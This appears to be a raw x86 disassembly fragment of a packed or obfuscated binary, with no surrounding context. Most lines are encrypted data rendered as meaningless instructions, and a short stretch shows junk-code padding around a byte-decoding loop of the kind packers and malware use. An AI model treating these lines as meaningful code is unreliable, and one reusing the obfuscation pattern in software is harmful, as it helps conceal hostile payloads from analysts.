  41635e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41635f:	(bad)  
  416361:	xor    BYTE PTR [eax],al
  416363:	dec    esp
  416364:	push   ebp
  416365:	popa   
  416366:	push   edx
  416367:	lock jbe 0x416382
  41636a:	in     al,dx
  41636b:	(bad)  
  41636c:	push   ss
  41636d:	and    DWORD PTR [ebx+0xb680905],ebx
  416373:	sti    
  416374:	push   ds
  416375:	shr    DWORD PTR [esi],cl
  416377:	nop
  416378:	pop    ds
  416379:	nop
  41637a:	adc    BYTE PTR ds:0xb15147c5,0xa7
  416381:	jge    0x4163a2
  416383:	xchg   edi,eax
  416384:	add    ch,BYTE PTR [edi-0x19]
  416387:	in     eax,0x85
  416389:	sub    DWORD PTR [eax-0x24],edx
  41638c:	cmp    bl,BYTE PTR ds:0x5365a5c3
  416392:	sbb    DWORD PTR [esi+0x1158490f],esp
  416398:	jnp    0x4163ea
  41639a:	(bad)  
  41639b:	jo     0x4163b8
  41639d:	sar    al,cl
  41639f:	loop   0x416398
  4163a1:	mov    ds:0xc2303973,al
  4163a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163a7:	and    BYTE PTR [ecx-0x2a],al
  4163aa:	add    eax,0x9378dd5b
  4163af:	fmul   st(7),st
  4163b1:	jmp    0x9aca:0xeff16da6
  4163b8:	loope  0x4163b2
  4163ba:	dec    edi
  4163bb:	sbb    dl,BYTE PTR [ecx]
  4163bd:	cmp    edx,DWORD PTR [ebx+0x68]
  4163c0:	add    al,0x93
  4163c2:	mov    WORD PTR [eax+esi*8],gs
  4163c5:	jecxz  0x4163e7
  4163c7:	imul   edx,DWORD PTR [edx+ebp*1-0x3b],0x3f
  4163cc:	hlt    
  4163cd:	push   es
  4163ce:	push   edx
  4163cf:	push   ecx
  4163d0:	ins    BYTE PTR es:[edi],dx
  4163d1:	test   BYTE PTR [edx+0xfbb7e17],bh
  4163d7:	enter  0x37f4,0x1
  4163db:	xor    esi,DWORD PTR [eax-0x63]
  4163de:	mov    ds:0x9d61f6f9,eax
  4163e3:	or     BYTE PTR [ecx+ebp*2],dh
  4163e6:	adc    eax,0x9cb22a1b
  4163eb:	add    bh,BYTE PTR [esi-0x66]
  4163ee:	cdq    
  4163ef:	retf   
  4163f0:	xchg   edi,eax
  4163f1:	sahf   
  4163f2:	lods   eax,DWORD PTR ds:[esi]
  4163f3:	ss fwait
  4163f5:	sbb    eax,0xaa8812
  4163fa:	push   ds
  4163fb:	in     al,0x55
  4163fd:	pusha  
  4163fe:	les    ecx,FWORD PTR ds:0x7530dcd7
  416404:	arpl   WORD PTR [edi+0x5398eddb],di
  41640a:	adc    al,0x25
  41640c:	cmp    ch,BYTE PTR [eax+0x5bc9de9e]
  416412:	adc    al,al
  416414:	push   esp
  416415:	xor    BYTE PTR [ebp-0x40d0e941],dh
  41641b:	xchg   DWORD PTR [eax-0x27],ecx
  41641e:	arpl   WORD PTR [esi+0x73c36016],sp
  416424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416425:	ds or  ebp,esp
  416428:	scas   al,BYTE PTR es:[edi]
  416429:	or     ah,BYTE PTR [edx]
  41642b:	icebp  
  41642c:	(bad)  
  41642d:	es retf 
  41642f:	mov    edx,0x7bf922ff
  416434:	shl    DWORD PTR [eax-0x74],0xcb
  416438:	nop
  416439:	ds es inc edi
  41643c:	data16 test bh,bl
  41643f:	test   BYTE PTR [esi-0xb],bl
  416442:	div    DWORD PTR [di]
  416445:	push   0xffffff91
  416447:	mov    ds:0xd57f5c1f,eax
  41644c:	ret    0x776f
  41644f:	or     esi,DWORD PTR [edi]
  416451:	scas   eax,DWORD PTR es:[edi]
  416452:	shl    DWORD PTR [edi-0xdb53c21],1
  416458:	hlt    
  416459:	dec    edx
  41645a:	and    eax,edi
  41645c:	(bad)  
  41645d:	repz inc edi
  41645f:	(bad)  
  416461:	mov    eax,0x367cd219
  416466:	lea    ebp,[eax+0x3b3f7593]
  41646c:	shr    bh,cl
  41646e:	js     0x416411
  416470:	fcomp  DWORD PTR [ebx+0x4b7416b5]
  416476:	mov    ds:0xa3dd4161,al
  41647b:	test   eax,0xb11b7c7a
  416480:	aaa    
  416481:	mov    dl,0x56
  416483:	push   edx
  416484:	dec    edx
  416485:	mov    bh,0xa2
  416487:	push   edx
  416488:	cmp    cl,0xf0
  41648b:	cwde   
  41648c:	fsubr  QWORD PTR [ebx-0x66]
  41648f:	jl     0x4164ba
  416491:	cmp    esi,DWORD PTR [ecx]
  416493:	pop    edi
  416494:	nop
  416495:	call   0x7f2:0xeb3a781a
  41649c:	(bad)  
  41649d:	mov    al,ds:0xcbb328c4
  4164a2:	retf   0x1232
  4164a5:	pop    DWORD PTR [ebx]
  4164a7:	and    al,0x3b
  4164a9:	lock mov al,ds:0x3de539a1
  4164af:	mov    ch,0xf5
  4164b1:	jecxz  0x4164a1
  4164b3:	dec    esi
  4164b4:	js     0x4164e8
  4164b6:	mov    dh,0x7c
  4164b8:	jmp    0x416477
  4164ba:	pop    ebp
  4164bb:	fcomp  QWORD PTR [ecx]
  4164bd:	push   ss
  4164be:	test   eax,0xa2f1cc77
  4164c3:	dec    esp
  4164c4:	sbb    dh,BYTE PTR [ebx]
  4164c6:	jge    0x416448
  4164c8:	setp   BYTE PTR ds:0x963de46a
  4164cf:	jg     0x416493
  4164d1:	(bad)  
  4164d2:	add    al,BYTE PTR [ebx+0x3f8ffee7]
  4164d8:	gs jne 0x416485
  4164db:	adc    eax,0xaf6b3a67
  4164e0:	fmulp  st(1),st
  4164e2:	stos   BYTE PTR es:[edi],al
  4164e3:	(bad)  
  4164e4:	ss (bad) 
  4164e6:	dec    edi
  4164e7:	fadd   DWORD PTR [edx+0x36236cc9]
  4164ed:	arpl   WORD PTR [ebx+0x65],ax
  4164f0:	shl    esi,1
  4164f2:	add    BYTE PTR [edx-0x4c7293c9],0xbc
  4164f9:	sbb    edx,DWORD PTR [esi-0x39cd9e6]
  4164ff:	mov    ebx,esi
  416501:	push   cs
  416502:	test   DWORD PTR [esi+0x7b],ebx
  416505:	pop    ebx
  416506:	mov    ah,0x3c
  416508:	data16 jg 0x4164f9
  41650b:	pop    ebx
  41650c:	stc    
  41650d:	mov    ebx,0x4c059e4a
  416512:	mov    al,ds:0x7aa85722
  416517:	cmp    bl,BYTE PTR [esi-0x35d044c8]
  41651d:	xchg   edx,eax
  41651e:	xor    BYTE PTR [ecx+ebp*8+0x1],bh
  416522:	repz push ebx
  416524:	add    dl,BYTE PTR [edx-0x2a]
  416527:	jg     0x416555
  416529:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41652a:	loopne 0x41656c
  41652c:	(bad)  
  41652e:	shr    DWORD PTR [eax-0x2f],0x72
  416532:	xchg   edx,eax
  416533:	jbe    0x4165a7
  416535:	imul   esp,DWORD PTR [eax],0x1d
  416538:	cwde   
  416539:	fidivr WORD PTR [eax]
  41653b:	push   ecx
  41653c:	xor    ebp,DWORD PTR [edx-0x4cc408e4]
  416542:	cwde   
  416543:	sbb    bl,BYTE PTR ds:0xe3b91e2e
  416549:	push   esi
  41654a:	pop    edx
  41654b:	lods   al,BYTE PTR ds:[esi]
  41654c:	outs   dx,BYTE PTR ds:[esi]
  41654d:	jmp    0xe700:0x47761895
  416554:	sbb    al,0xd6
  416556:	hlt    
  416557:	push   esp
  416558:	jp     0x416582
  41655a:	and    esi,edi
  41655c:	mov    WORD PTR [ecx],?
  41655e:	xor    eax,edi
  416560:	shr    eax,0x2
  416563:	or     ecx,eax
  416565:	push   ecx
  416566:	lea    eax,[ebp-0x2c]
  416569:	push   eax
  41656a:	mov    eax,DWORD PTR [ebp+0x10]
  41656d:	mov    ecx,DWORD PTR [ebp+0x14]
  416570:	shrd   eax,ecx,0x2
  416574:	shr    ecx,0x2
  416577:	mov    ecx,DWORD PTR [ebp+0x10]
  41657a:	mov    edx,DWORD PTR [ebp+0x14]
  41657d:	xor    edx,edx
  41657f:	shl    ecx,0x1e
  416582:	mov    ecx,DWORD PTR [ebp+0x10]
  416585:	xor    eax,esi
  416587:	or     eax,edx
  416589:	mov    edx,DWORD PTR [ebp+0x14]
  41658c:	shrd   ecx,edx,0x2
  416590:	shr    edx,0x2
  416593:	mov    edx,DWORD PTR [ebp+0x10]
  416596:	mov    ebx,DWORD PTR [ebp+0x14]
  416599:	xor    ecx,esi
  41659b:	xor    ebx,ebx
  41659d:	or     ecx,ebx
  41659f:	shl    edx,0x1e
  4165a2:	add    eax,ecx
  4165a4:	mov    ecx,DWORD PTR [ebp+0x10]
  4165a7:	mov    edx,DWORD PTR [ebp+0x14]
  4165aa:	shrd   ecx,edx,0x2
  4165ae:	shr    edx,0x2
  4165b1:	xor    ecx,esi
  4165b3:	mov    edx,DWORD PTR [ebp+0x10]
  4165b6:	mov    ebx,DWORD PTR [ebp+0x14]
  4165b9:	xor    ebx,ebx
  4165bb:	or     ecx,ebx
  4165bd:	add    eax,ecx
  4165bf:	lea    eax,[ebp+eax*4-0x78]
  4165c3:	push   eax
  4165c4:	shl    edx,0x1e
  4165c7:	call   0x415231
  4165cc:	mov    eax,DWORD PTR [ebp-0x7c]
  4165cf:	mov    ecx,DWORD PTR [ebp-0x7c]
  4165d2:	xor    eax,edi
  4165d4:	xor    ecx,0xfffffffe
  4165d7:	shr    eax,0x2
  4165da:	shl    ecx,0x1e
  4165dd:	or     ecx,eax
  4165df:	mov    DWORD PTR [ebp-0x7c],ecx
  4165e2:	lea    eax,[ebp-0x7c]
  4165e5:	push   eax
  4165e6:	mov    eax,DWORD PTR [ebp+0x10]
  4165e9:	mov    ecx,DWORD PTR [ebp+0x14]
  4165ec:	shrd   eax,ecx,0x2
  4165f0:	shr    ecx,0x2
  4165f3:	mov    ecx,DWORD PTR [ebp+0x10]
  4165f6:	mov    edx,DWORD PTR [ebp+0x14]
  4165f9:	xor    eax,esi
  4165fb:	xor    edx,edx
  4165fd:	or     eax,edx
  4165ff:	push   eax
  416600:	mov    eax,ds:0x422548
  416605:	mov    edi,0x42248e
  41660a:	push   edi
  41660b:	push   DWORD PTR [eax]
  41660d:	shl    ecx,0x1e
  416610:	call   0x41e9f9
  416615:	lea    eax,[ebp-0x7c]
  416618:	push   eax
  416619:	mov    eax,DWORD PTR [ebp+0x10]
  41661c:	mov    ecx,DWORD PTR [ebp+0x14]
  41661f:	shrd   eax,ecx,0x2
  416623:	shr    ecx,0x2
  416626:	mov    ecx,DWORD PTR [ebp+0x10]
  416629:	mov    edx,DWORD PTR [ebp+0x14]
  41662c:	xor    eax,esi
  41662e:	xor    edx,edx
  416630:	or     eax,edx
  416632:	push   eax
  416633:	mov    eax,ds:0x422548
  416638:	push   edi
  416639:	push   DWORD PTR [eax]
  41663b:	shl    ecx,0x1e
  41663e:	call   0x41e9f9
  416643:	mov    eax,DWORD PTR [ebp-0x30]
  416646:	mov    eax,DWORD PTR [ebp-0x20]
  416649:	mov    edi,DWORD PTR [ebp-0x14]
  41664c:	mov    eax,DWORD PTR [ebp-0x24]
  41664f:	mov    ecx,edi
  416651:	mov    DWORD PTR [ebp-0x1c],eax
  416654:	rol    ecx,0x2
  416657:	mov    eax,0xa4069aae
  41665c:	xor    ecx,eax
  41665e:	cmp    ecx,eax
  416660:	je     0x416bfd
  416666:	mov    edx,0x1001
  41666b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41666e:	xor    eax,eax
  416670:	test   ecx,ecx
  416672:	je     0x41669d
  416678:	mov    bl,BYTE PTR [eax+edi*1]
  41667b:	mov    BYTE PTR [ebp-0x1],bl
  41667e:	movzx  ebx,BYTE PTR [ebp-0x1]
  416682:	sub    ebx,0xec
  416688:	mov    BYTE PTR [ebp-0x1],bl
  41668b:	ror    BYTE PTR [ebp-0x1],1
  41668e:	mov    bl,BYTE PTR [ebp-0x1]
  416691:	mov    BYTE PTR [eax+edi*1],bl
  416694:	inc    eax
  416695:	cmp    eax,ecx
  416697:	jb     0x416678
  41669d:	dec    edx
  41669e:	jne    0x41666b
  4166a4:	mov    eax,DWORD PTR [ebp+0x8]
  4166a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4166aa:	shrd   eax,ecx,0x2
  4166ae:	shr    ecx,0x2
  4166b1:	mov    ecx,DWORD PTR [ebp+0x8]
  4166b4:	mov    edx,DWORD PTR [ebp+0xc]
  4166b7:	xor    eax,esi
  4166b9:	xor    edx,edx
  4166bb:	or     eax,edx
  4166bd:	push   0x1
  4166bf:	add    eax,edi
  4166c1:	push   eax
  4166c2:	lea    eax,[ebp-0x2]
  4166c5:	push   eax
  4166c6:	shl    ecx,0x1e
  4166c9:	call   0x415231
  4166ce:	mov    eax,DWORD PTR [ebp+0x10]
  4166d1:	mov    ecx,DWORD PTR [ebp+0x14]
  4166d4:	shrd   eax,ecx,0x2
  4166d8:	shr    ecx,0x2
  4166db:	mov    ecx,DWORD PTR [ebp+0x10]
  4166de:	mov    edx,DWORD PTR [ebp+0x14]
  4166e1:	xor    eax,esi
  4166e3:	xor    edx,edx
  4166e5:	or     eax,edx
  4166e7:	add    eax,edi
  4166e9:	push   0x1
  4166eb:	push   eax
  4166ec:	mov    eax,DWORD PTR [ebp+0x8]
  4166ef:	shl    ecx,0x1e
  4166f2:	mov    ecx,DWORD PTR [ebp+0xc]
  4166f5:	shrd   eax,ecx,0x2
  4166f9:	shr    ecx,0x2
  4166fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4166ff:	mov    edx,DWORD PTR [ebp+0xc]
  416702:	xor    eax,esi
  416704:	xor    edx,edx
  416706:	or     eax,edx
  416708:	add    eax,edi
  41670a:	push   eax
  41670b:	shl    ecx,0x1e
  41670e:	call   0x415231
  416713:	push   0x1
  416715:	jmp    0x416975
  41671a:	out    dx,eax
  41671b:	(bad)
  41671f:	mov    dl,0x2a
  416721:	dec    esi
  416722:	xchg   ebx,eax
  416723:	fistp  WORD PTR [ebp-0x55f3990]
  416729:	mov    esi,0x1816fc77
  41672e:	fwait
  41672f:	adc    al,0x18
  416731:	sbb    BYTE PTR [eax],cl
  416733:	inc    ecx
  416734:	test   eax,0x2d4a5ff8
  416739:	sbb    al,0xae
  41673b:	mov    eax,ds:0x14465417
  416740:	mov    ds:0x8f89d26f,al
  416745:	sbb    DWORD PTR [esi],esi
  416747:	or     eax,DWORD PTR [esi+edi*8+0x2db1182b]
  41674e:	xchg   ecx,eax
  41674f:	mov    dl,0xa1
  416751:	sbb    BYTE PTR [eax-0x36],bl
  416754:	sbb    eax,edi
  416756:	push   esi
  416757:	sub    dh,BYTE PTR [edx+0x1b]
  41675a:	ret    0x152d
  41675d:	mov    esi,0x4fe20555
  416762:	scas   al,BYTE PTR es:[edi]
  416763:	(bad)  
  416765:	in     eax,0xda
  416767:	fadd   QWORD PTR [ebp-0x65ca6996]
  41676d:	es mov ebx,0x700a9792
  416773:	pop    eax
  416774:	test   eax,0x6131052f
  416779:	sub    ebx,DWORD PTR [edx+ebx*1-0x32]
  41677d:	cwde   
  41677e:	push   cs
  41677f:	je     0x4167b3
  416781:	xchg   esp,eax
  416782:	sti    
  416783:	or     BYTE PTR [edx-0x51],ah
  416786:	test   eax,0x9b2721fb
  41678b:	xchg   DWORD PTR [ebx],edx
  41678d:	or     BYTE PTR [eax+0x7e],0x9a
  416791:	imul   ecx,DWORD PTR [edx+0x67c8e6f1],0xfffffff0
  416798:	and    DWORD PTR [ebx+0x1a],esp
  41679b:	fdivr  st(7),st
  41679d:	xchg   ebp,eax
  41679e:	jno    0x416737
  4167a0:	mov    al,0x15
  4167a2:	call   0x5403:0x6537dc2b
  4167a9:	lahf   
  4167aa:	js     0x416814
  4167ac:	aas    
  4167ad:	dec    ecx
  4167ae:	dec    eax
  4167af:	in     eax,0x12
  4167b1:	sar    eax,1
  4167b3:	or     dl,ah
  4167b5:	mov    DWORD PTR [edx],esi
  4167b7:	test   BYTE PTR [eax+0x2a5a65af],0x92
  4167be:	popa   
  4167bf:	lods   al,BYTE PTR ds:[esi]
  4167c0:	es xchg esi,eax
  4167c2:	and    BYTE PTR [edx+0x52beb841],ch
  4167c8:	fild   WORD PTR [ecx+edi*8+0x15]
  4167cc:	jne    0x416754
  4167ce:	sti    
  4167cf:	imul   eax,DWORD PTR [edx],0xfffffff3
  4167d2:	pop    ecx
  4167d3:	int3   
  4167d4:	mov    edx,0x69f526f9
  4167d9:	push   edx
  4167da:	jae    0x4167a1
  4167dc:	push   edx
  4167dd:	and    BYTE PTR [edx-0x3d40ec0e],ah
  4167e3:	mov    ah,0xb1
  4167e5:	push   edx
  4167e6:	push   esi
  4167e7:	and    edx,DWORD PTR [ebx-0x68]
  4167ea:	iret   
  4167eb:	push   0x7d897c32
  4167f0:	jge    0x4167e1
  4167f2:	shr    DWORD PTR [edx-0x6a],1
  4167f5:	inc    edx
  4167f6:	imul   eax,DWORD PTR [ebp-0x69844e8f],0xffffffd3
  4167fd:	pop    esi
  4167fe:	or     BYTE PTR [ecx-0x66],dh
  416801:	inc    edx
  416802:	jmp    0xc3464d5f
  416807:	dec    ebx
  416808:	ss mov eax,0xab791702
  41680e:	mov    bh,0xc
  416810:	shl    DWORD PTR [edi-0x49],1
  416813:	shl    eax,1
  416815:	ret    
  416816:	arpl   WORD PTR [edi+0x28],si
  416819:	push   esi
  41681a:	stc    
  41681b:	sbb    DWORD PTR [eax+eax*1+0x59dc2bab],edx
  416822:	sub    bp,cx
  416825:	pop    ebx
  416826:	adc    ah,BYTE PTR [ebp-0x2ae7f5cb]
  41682c:	sbb    eax,0xc6c268f4
  416831:	or     edx,eax
  416833:	mov    al,0x13
  416835:	aas    
  416836:	xor    al,0x0
  416838:	lahf   
  416839:	sbb    al,0xc2
  41683b:	push   esp
  41683c:	pusha  
  41683d:	cwde   
  41683e:	jl     0x416877
  416840:	pop    ebp
  416841:	adc    BYTE PTR [esi],0x28
  416844:	mov    esi,0x18463fbe
  416849:	arpl   WORD PTR [edi],si
  41684b:	adc    ch,BYTE PTR [edx]
  41684d:	mov    esp,0x773dc2c5
  416852:	mov    dl,0xb6
  416854:	dec    edx
  416855:	pop    ecx
  416856:	lock sbb ebx,ebx
  416859:	retf   
  41685a:	ror    BYTE PTR [ebp+0x2e],cl
  41685d:	dec    ebx
  41685e:	mov    ah,0xe3
  416860:	adc    eax,DWORD PTR [eiz*1-0x5b3e56d8]
  416867:	adc    BYTE PTR [edi+0x3d12e736],0x2c
  41686e:	(bad)  
  41686f:	jb     0x4168e7
  416871:	cmc    
  416872:	data16 int3 
  416874:	cmp    dl,BYTE PTR [esi-0x21]
  416877:	les    esi,FWORD PTR [ebx+0x55]
  41687a:	add    al,0x9
  41687c:	lock test DWORD PTR [ecx],ebx
  41687f:	or     bl,BYTE PTR [ecx+0x67]
  416882:	mov    ds:0x155415c4,eax
  416887:	jnp    0x416829
  416889:	es adc eax,0x83cf77bb
  41688f:	xor    al,0x8b
  416891:	sbb    ch,ah
  416893:	push   es
  416894:	mov    ebx,0x97d8d26
  416899:	lods   al,BYTE PTR ds:[esi]
  41689a:	std    
  41689b:	fs fs pop es
  41689e:	sbb    DWORD PTR [eax+0x20],edi
  4168a1:	retf   
  4168a2:	or     al,0x4b
  4168a4:	or     DWORD PTR [ebp+0x751b8891],eax
  4168aa:	mov    cl,BYTE PTR ds:0xefb2f5e8
  4168b0:	daa    
  4168b1:	jg     0x416836
  4168b3:	mov    DWORD PTR [edx],esi
  4168b5:	pop    eax
  4168b6:	pop    edx
  4168b7:	jbe    0x41684c
  4168b9:	aas    
  4168ba:	adc    eax,0xfcbbe894
  4168bf:	aas    
  4168c0:	ins    DWORD PTR es:[edi],dx
  4168c1:	mov    ecx,0x4486946f
  4168c6:	mov    ds:0xf2343f3d,eax
  4168cb:	xchg   ecx,eax
  4168cc:	sbb    eax,0x363450a5
  4168d1:	sbb    al,0x11
  4168d3:	inc    ebx
  4168d4:	int3   
  4168d5:	mov    eax,0xc7974f35
  4168da:	mov    cl,0xf8
  4168dc:	ret    
  4168dd:	xor    DWORD PTR [ebp+0x68],eax
  4168e0:	sub    BYTE PTR [ebx],ah
  4168e2:	xor    BYTE PTR [edi+0x10],0xc8
  4168e6:	mov    ch,BYTE PTR [eax+0x2715a533]
  4168ec:	aas    
  4168ed:	sahf   
  4168ee:	inc    eax
  4168ef:	and    al,0x3e
  4168f1:	or     eax,0x2a59951
  4168f6:	jno    0x416940
  4168f8:	mov    esp,ebp
  4168fa:	mov    eax,0xa3af652d
  4168ff:	dec    esp
  416900:	bound  ebx,QWORD PTR [edx-0x64]
  416903:	mov    bh,BYTE PTR [ebx-0x21fa4e4d]
  416909:	int3   
  41690a:	jns    0x416904
  41690c:	mov    esp,0x5b6e564e
  416911:	push   cs
  416912:	adc    eax,0x2ecd365a
  416917:	fisttp QWORD PTR [edi-0x2d8252e1]
  41691d:	out    0x25,al
  41691f:	dec    ecx
  416920:	jmp    0x47480d95
  416925:	lods   eax,DWORD PTR ds:[esi]
  416926:	rol    DWORD PTR [ebx+0x24],cl
  416929:	lea    ebp,[edx+0x6b]
  41692c:	dec    esp
  41692d:	add    ebx,DWORD PTR [edx+0x5a]
  416930:	(bad)  
  416932:	lods   eax,DWORD PTR ds:[esi]
  416933:	push   esi
  416934:	push   ss
  416935:	outs   dx,BYTE PTR ds:[esi]
  416936:	iret   
  416937:	sub    ah,ch
  416939:	ds push edi
  41693b:	inc    esp
  41693c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41693d:	mov    BYTE PTR [esi+0x5d04735],0x96
  416944:	out    0xa7,eax
  416946:	and    DWORD PTR [ecx],0xe5c99072
  41694c:	inc    ebp
  41694d:	stos   BYTE PTR es:[edi],al
  41694e:	in     eax,0xa0
  416950:	xchg   esp,eax
  416951:	sar    BYTE PTR [ecx],cl
  416953:	iret   
  416954:	shl    dh,0xba
  416957:	mov    eax,0xd3b2b19a
  41695c:	adc    BYTE PTR [edi],bl
  41695e:	mov    ss,WORD PTR [esi]
  416960:	sbb    DWORD PTR [esi-0x1279e98f],esp
  416966:	lods   al,BYTE PTR ds:[esi]
  416967:	out    dx,eax
  416968:	nop
  416969:	xor    ah,BYTE PTR [edx+0x79]
  41696c:	jge    0x416964
  41696e:	(bad)  
  41696f:	in     eax,0xb0
  416971:	mov    esi,0x8d38b537
  416976:	inc    ebp
  416977:	(bad)  
  416978:	push   eax
  416979:	mov    eax,DWORD PTR [ebp+0x10]
  41697c:	mov    ecx,DWORD PTR [ebp+0x14]
  41697f:	shrd   eax,ecx,0x2
  416983:	shr    ecx,0x2
  416986:	mov    ecx,DWORD PTR [ebp+0x10]
  416989:	mov    edx,DWORD PTR [ebp+0x14]
  41698c:	xor    eax,esi
  41698e:	jmp    0x416bee
  416993:	mov    eax,0x2c1e900d
  416998:	sbb    ah,BYTE PTR [esi-0xf757786]
  41699e:	mov    esi,0xbc99aa92
  4169a3:	stc    
  4169a4:	clc    
  4169a5:	push   ss
  4169a6:	sbb    BYTE PTR [ebx-0x27e7e7ec],bl
  4169ac:	xchg   edi,eax
  4169ad:	adc    bh,bl
  4169af:	mov    al,0xff
  4169b1:	call   0xd360f92d
  4169b6:	jp     0x4169d9
  4169b8:	xchg   BYTE PTR [esi+edx*4],ch
  4169bb:	xchg   DWORD PTR [edx],ebx
  4169bd:	add    edi,DWORD PTR [edx-0x19c37369]
  4169c3:	and    ah,0x19
  4169c6:	ins    BYTE PTR es:[edi],dx
  4169c7:	dec    edi
  4169c8:	mov    DWORD PTR [edi+ebp*2+0x772e713d],ebx
  4169cf:	mov    al,ds:0x1c6573ed
  4169d4:	shl    ebp,0xe3
  4169d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169d8:	lds    ebx,FWORD PTR [esi-0x4cc6ab21]
  4169de:	dec    edx
  4169df:	sti    
  4169e0:	or     BYTE PTR [ebx-0x534dc826],dl
  4169e6:	shl    DWORD PTR [ebp+0x4da7bb8],cl
  4169ec:	test   al,0x99
  4169ee:	hlt    
  4169ef:	sti    
  4169f0:	sbb    esp,DWORD PTR [edx+0x4db7e879]
  4169f6:	or     edi,DWORD PTR [ecx-0x2407299b]
  4169fc:	add    al,0x64
  4169fe:	dec    dx
  416a00:	aad    0xac
  416a02:	enter  0xdce2,0xbf
  416a06:	enter  0xcddb,0xe8
  416a0a:	scas   al,BYTE PTR es:[edi]
  416a0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a0c:	leave  
  416a0d:	xor    al,0x5
  416a0f:	mov    al,ds:0xa5dcf173
  416a14:	lahf   
  416a15:	retf   0xa136
  416a18:	into   
  416a19:	mov    ecx,0x31fc8853
  416a1e:	shl    BYTE PTR [edx+0x450fb14],cl
  416a24:	sbb    ebp,DWORD PTR [esi-0x16]
  416a27:	ss mov dh,0x8c
  416a2a:	mov    bh,0xa8
  416a2c:	pop    ebp
  416a2d:	popa   
  416a2e:	inc    esp
  416a2f:	call   0x6ffe:0x9c639c69
  416a36:	retf   0x8e44
  416a39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a3a:	lock repnz fcomp QWORD PTR [edx+ebp*1+0x6a088e93]
  416a43:	add    BYTE PTR [ebp-0x42],bl
  416a46:	and    BYTE PTR [edi-0x76020655],al
  416a4c:	jne    0x416a40
  416a4e:	inc    edi
  416a4f:	push   esp
  416a50:	scas   eax,DWORD PTR es:[edi]
  416a51:	jecxz  0x416a3e
  416a53:	dec    DWORD PTR [ebx-0x4ebf832b]
  416a59:	add    ch,BYTE PTR [edx+0x2]
  416a5c:	push   ds
  416a5d:	movhps QWORD PTR [ecx+0x70ec1dc8],xmm7
  416a64:	or     al,0x1b
  416a66:	mov    ah,0xcd
  416a68:	daa    
  416a69:	into   
  416a6a:	or     al,0x34
  416a6c:	(bad)  
  416a6d:	jns    0x416ab7
  416a6f:	sbb    eax,0x97090bb7
  416a74:	dec    ebp
  416a75:	in     eax,0x53
  416a77:	out    dx,eax
  416a78:	sub    al,0x44
  416a7a:	popa   
  416a7b:	int    0x4
  416a7d:	add    al,0x3f
  416a7f:	out    0x7f,al
  416a81:	inc    ebp
  416a82:	stos   DWORD PTR es:[edi],eax
  416a83:	jns    0x416a15
  416a85:	sub    BYTE PTR [ecx+0x3d24ef0],0xdc
  416a8c:	test   DWORD PTR [eax+ebp*1+0x4a],esi
  416a90:	shr    DWORD PTR [edx],0xf4
  416a93:	imul   esp,DWORD PTR [edi+0x67],0xbad0d8f6
  416a9a:	je     0x416a23
  416a9c:	imul   ebx,DWORD PTR ds:0xe197c9b6,0x45
  416aa3:	arpl   si,cx
  416aa5:	jno    0x416a83
  416aa7:	aad    0x2e
  416aa9:	aas    
  416aaa:	lock int 0x12
  416aad:	retf   
  416aae:	ss gs lock loope 0x416aac
  416ab3:	fwait
  416ab4:	clc    
  416ab5:	int    0x77
  416ab7:	shl    eax,0x57
  416aba:	fld    st(7)
  416abc:	scas   al,BYTE PTR es:[edi]
  416abd:	popf   
  416abe:	retf   0xcde3
  416ac1:	add    esp,DWORD PTR [ecx]
  416ac3:	(bad)  ds:[eax]
  416ac6:	fwait
  416ac7:	jb     0x416ab7
  416ac9:	mov    ebp,0x2804aaa
  416ace:	cmp    ebx,edx
  416ad0:	daa    
  416ad1:	add    dl,ch
  416ad3:	xchg   ebp,eax
  416ad4:	fnsave [edi+0x69]
  416ad7:	push   ds
  416ad8:	lods   eax,DWORD PTR ds:[esi]
  416ad9:	dec    edi
  416ada:	rol    cl,cl
  416adc:	rcl    BYTE PTR [ebp+0x42],1
  416adf:	mov    bl,0x69
  416ae1:	shr    BYTE PTR [ebp+0x1f],0x5
  416ae5:	mov    BYTE PTR [edi],ah
  416ae7:	fwait
  416ae8:	ds pop esp
  416aea:	mov    bl,0xa6
  416aec:	adc    edi,DWORD PTR [ebx+0x34]
  416aef:	add    dl,BYTE PTR [edi-0x63a44be3]
  416af5:	test   al,bh
  416af7:	stos   DWORD PTR es:[edi],eax
  416af8:	adc    al,0x41
  416afa:	push   0x1b18b5f2
  416aff:	mov    ds:0xc46668ad,eax
  416b04:	add    eax,0x5d849d3c
  416b09:	and    esp,DWORD PTR [edi*4-0x54b6f908]
  416b10:	pop    edx
  416b11:	fadd   QWORD PTR [ebp+0x4532054f]
  416b17:	ins    DWORD PTR es:[edi],dx
  416b18:	fidivr WORD PTR [eax-0x5a959385]
  416b1e:	add    BYTE PTR [edx-0x30],bl
  416b21:	lahf   
  416b22:	adc    eax,DWORD PTR [ecx+0x235c25f4]
  416b28:	jno    0x416b14
  416b2a:	adc    DWORD PTR [ecx],ebp
  416b2c:	jge    0x416b8b
  416b2e:	out    dx,eax
  416b2f:	jecxz  0x416abc
  416b31:	and    al,0xd6
  416b33:	add    eax,DWORD PTR [ebp+0x5ced4c07]
  416b39:	shr    ebp,cl
  416b3b:	mov    ah,0xe1
  416b3d:	call   0xaa22bd55
  416b42:	(bad)  
  416b43:	(bad)  
  416b44:	xor    DWORD PTR ds:0x4200376b,esi
  416b4a:	mov    ah,0xdf
  416b4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b4d:	xchg   edx,eax
  416b4e:	add    dl,BYTE PTR [esi]
  416b50:	sti    
  416b51:	cwde   
  416b52:	loopne 0x416b59
  416b54:	pop    edi
  416b55:	mov    BYTE PTR [ebp+0x353c1233],0x40
  416b5c:	dec    esp
  416b5d:	mov    eax,ds:0x3aef8184
  416b62:	adc    edi,DWORD PTR [eax-0x70]
  416b65:	mov    esi,0x7a5506f
  416b6a:	jmp    0x416aef
  416b6c:	jp     0x416bcd
  416b6e:	pop    ebp
  416b6f:	cmp    BYTE PTR [edx-0x2f],dh
  416b72:	cmp    edx,DWORD PTR [edx+0x1b]
  416b75:	push   0x55
